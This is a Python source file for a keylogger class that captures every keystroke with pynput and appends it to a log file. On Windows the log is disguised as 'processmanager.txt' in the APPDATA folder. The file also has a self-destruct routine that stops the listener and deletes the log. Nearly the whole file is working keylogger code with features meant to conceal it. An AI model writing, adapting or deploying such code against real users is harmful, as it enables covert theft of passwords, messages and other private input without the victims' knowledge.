import os
# import time
import threading
from sys import platform

from time import sleep

from pynput.keyboard import Listener

class Keylogger():
    keys = []
    count = 0
    flag = 0
    if platform == 'win32':
        path = os.environ['appdata'] +'\\processmanager.txt' 
    elif platform == "linux" or platform == "linux2" or platform == "darwin": 
        path = 'processmanager.txt'

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' [BACKSPACE] ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' [SHIFT] ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' [CAPS_LOCK] ')
                elif k.find('ctrl') > 0:
                    f.write(' [CTRL] ')
                elif k.find('alt') > 0:
                    f.write(' [ALT] ')
                elif k.find('tab') > 0:
                    f.write(' [TAB] ')
                elif k.find('left') > 0:
                    f.write(' [LEFT_ARROW] ')
                elif k.find('right') > 0:
                    f.write(' [RIGHT_ARROW] ')
                elif k.find('up') > 0:
                    f.write(' [UP_ARROW] ')
                elif k.find('down') > 0:
                    f.write(' [DOWN_ARROW] ')
                elif k.find('Key'):
                    f.write(' [OTHER_KEY: ' + k + '] ')
                else:
                    f.write(k)

    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def overwrite_file(self):
        print('keylog file path: ' + self.path)
        with open(self.path, 'w') as f:
            f.write('\n')

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == '__main__':
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    t.start()
    while keylog.flag != 1:
        sleep(10)
        logs = keylog.read_logs()
        print(logs)
    t.join()